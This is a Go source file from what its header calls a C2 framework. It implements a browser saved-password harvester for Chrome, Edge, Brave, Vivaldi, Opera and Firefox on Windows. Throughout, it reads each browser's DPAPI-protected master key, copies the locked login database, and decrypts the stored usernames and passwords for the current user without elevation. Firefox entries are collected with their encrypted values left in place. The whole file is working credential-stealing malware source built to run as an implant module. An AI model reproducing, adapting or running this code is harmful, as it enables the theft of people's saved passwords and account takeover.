package harvest

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Browser saved-password extractor — Chrome, Edge, Firefox, Brave.

	Chrome / Edge / Brave store passwords in an SQLite database encrypted
	with Windows DPAPI (Data Protection API), with an AES-256-GCM layer
	added in Chrome 80+ where the master key is stored in
	%LocalAppData%\<browser>\User Data\Local State (base64, DPAPI-protected).

	Firefox stores passwords in logins.json + key4.db (NSS key database).

	This module extracts passwords for the current user's profile without
	requiring elevated privileges — DPAPI decryption uses the current user's
	master key automatically.
*/

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
	_ "modernc.org/sqlite" // pure-Go SQLite, no CGO
)

// SavedPassword is one extracted credential entry.
type SavedPassword struct {
	Browser  string
	URL      string
	Username string
	Password string
	Profile  string
}

// chromiumProfile describes a Chromium-based browser installation.
type chromiumProfile struct {
	Name     string
	DataDir  string
}

var chromiumBrowsers = []chromiumProfile{
	{"Chrome", filepath.Join(os.Getenv("LOCALAPPDATA"), `Google\Chrome\User Data`)},
	{"Edge", filepath.Join(os.Getenv("LOCALAPPDATA"), `Microsoft\Edge\User Data`)},
	{"Brave", filepath.Join(os.Getenv("LOCALAPPDATA"), `BraveSoftware\Brave-Browser\User Data`)},
	{"Vivaldi", filepath.Join(os.Getenv("LOCALAPPDATA"), `Vivaldi\User Data`)},
	{"Opera", filepath.Join(os.Getenv("APPDATA"), `Opera Software\Opera Stable`)},
}

// ExtractBrowserPasswords collects saved passwords from all supported browsers.
func ExtractBrowserPasswords() ([]SavedPassword, error) {
	var all []SavedPassword

	for _, browser := range chromiumBrowsers {
		if _, err := os.Stat(browser.DataDir); os.IsNotExist(err) {
			continue
		}
		results, err := extractChromium(browser)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[harvest] %s error: %v", browser.Name, err)
			// {{end}}
			continue
		}
		all = append(all, results...)
	}

	// Firefox
	ffResults, _ := extractFirefox()
	all = append(all, ffResults...)

	return all, nil
}

// extractChromium extracts passwords from a Chromium-based browser.
func extractChromium(browser chromiumProfile) ([]SavedPassword, error) {
	// Step 1: Read the master AES key from Local State.
	masterKey, err := chromiumMasterKey(browser.DataDir)
	if err != nil {
		return nil, fmt.Errorf("master key: %w", err)
	}

	// Step 2: Find all profile directories.
	profiles, _ := filepath.Glob(filepath.Join(browser.DataDir, "Profile*"))
	profiles = append(profiles, filepath.Join(browser.DataDir, "Default"))

	var results []SavedPassword
	for _, profileDir := range profiles {
		loginDB := filepath.Join(profileDir, "Login Data")
		if _, err := os.Stat(loginDB); os.IsNotExist(err) {
			continue
		}
		// Copy the DB to temp (Chrome holds a lock on the original).
		tmpDB, err := copyToTemp(loginDB)
		if err != nil {
			continue
		}
		defer os.Remove(tmpDB)

		rows, err := queryLoginDB(tmpDB)
		if err != nil {
			continue
		}
		profileName := filepath.Base(profileDir)
		for _, row := range rows {
			plain, err := decryptChromiumPassword(row.encryptedPW, masterKey)
			if err != nil {
				continue
			}
			results = append(results, SavedPassword{
				Browser:  browser.Name,
				URL:      row.url,
				Username: row.username,
				Password: plain,
				Profile:  profileName,
			})
		}
	}
	return results, nil
}

// chromiumMasterKey reads and decrypts the AES-256 master key from Local State.
func chromiumMasterKey(dataDir string) ([]byte, error) {
	localState := filepath.Join(dataDir, "Local State")
	data, err := os.ReadFile(localState)
	if err != nil {
		return nil, err
	}

	var ls struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(data, &ls); err != nil {
		return nil, err
	}

	encKey, err := base64.StdEncoding.DecodeString(ls.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	// First 5 bytes are "DPAPI" prefix.
	if len(encKey) < 5 || string(encKey[:5]) != "DPAPI" {
		return nil, fmt.Errorf("unexpected key prefix")
	}
	return dpApiDecrypt(encKey[5:])
}

type loginRow struct {
	url         string
	username    string
	encryptedPW []byte
}

func queryLoginDB(dbPath string) ([]loginRow, error) {
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var result []loginRow
	for rows.Next() {
		var r loginRow
		if err := rows.Scan(&r.url, &r.username, &r.encryptedPW); err == nil {
			result = append(result, r)
		}
	}
	return result, nil
}

// decryptChromiumPassword decrypts a Chrome 80+ v10 encrypted password.
// Format: "v10" (3 bytes) + 12-byte IV + ciphertext + 16-byte GCM tag.
func decryptChromiumPassword(enc, masterKey []byte) (string, error) {
	if len(enc) < 3 {
		return "", fmt.Errorf("too short")
	}
	// Pre-Chrome 80 passwords are DPAPI-only (no v10 prefix).
	if string(enc[:3]) != "v10" {
		plain, err := dpApiDecrypt(enc)
		return string(plain), err
	}

	// v10 = AES-256-GCM with the 256-bit master key.
	if len(enc) < 3+12+16 {
		return "", fmt.Errorf("v10 packet too short")
	}
	iv := enc[3:15]
	ciphertext := enc[15:]

	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	plain, err := gcm.Open(nil, iv, ciphertext, nil)
	if err != nil {
		return "", err
	}
	return string(plain), nil
}

// dpApiDecrypt calls CryptUnprotectData to decrypt a DPAPI blob.
func dpApiDecrypt(data []byte) ([]byte, error) {
	var out windows.DataBlob
	in := windows.DataBlob{Size: uint32(len(data)), Data: &data[0]}
	if err := windows.CryptUnprotectData(&in, nil, nil, 0, nil, 0, &out); err != nil {
		return nil, err
	}
	result := make([]byte, out.Size)
	copy(result, (*[1 << 30]byte)(unsafe.Pointer(out.Data))[:out.Size])
	windows.LocalFree(windows.Handle(uintptr(unsafe.Pointer(out.Data))))
	return result, nil
}

func copyToTemp(src string) (string, error) {
	tmp, err := os.CreateTemp("", "*.db")
	if err != nil {
		return "", err
	}
	defer tmp.Close()
	in, err := os.Open(src)
	if err != nil {
		return "", err
	}
	defer in.Close()
	_, err = io.Copy(tmp, in)
	return tmp.Name(), err
}

// extractFirefox reads Firefox logins from logins.json.
// Full decryption requires NSS — we return the encrypted blobs with metadata.
func extractFirefox() ([]SavedPassword, error) {
	profilesDir := filepath.Join(os.Getenv("APPDATA"), `Mozilla\Firefox\Profiles`)
	dirs, err := filepath.Glob(filepath.Join(profilesDir, "*.default*"))
	if err != nil || len(dirs) == 0 {
		return nil, nil
	}

	var results []SavedPassword
	for _, dir := range dirs {
		loginsPath := filepath.Join(dir, "logins.json")
		data, err := os.ReadFile(loginsPath)
		if err != nil {
			continue
		}
		var logins struct {
			Logins []struct {
				Hostname          string `json:"hostname"`
				EncryptedUsername string `json:"encryptedUsername"`
				EncryptedPassword string `json:"encryptedPassword"`
			} `json:"logins"`
		}
		if err := json.Unmarshal(data, &logins); err != nil {
			continue
		}
		for _, l := range logins.Logins {
			results = append(results, SavedPassword{
				Browser:  "Firefox",
				URL:      l.Hostname,
				Username: "[NSS-encrypted: " + strings.TrimSpace(l.EncryptedUsername)[:min2(12, len(l.EncryptedUsername))] + "...]",
				Password: "[NSS-encrypted: " + strings.TrimSpace(l.EncryptedPassword)[:min2(12, len(l.EncryptedPassword))] + "...]",
				Profile:  filepath.Base(dir),
			})
		}
	}
	return results, nil
}

func min2(a, b int) int {
	if a < b {
		return a
	}
	return b
}
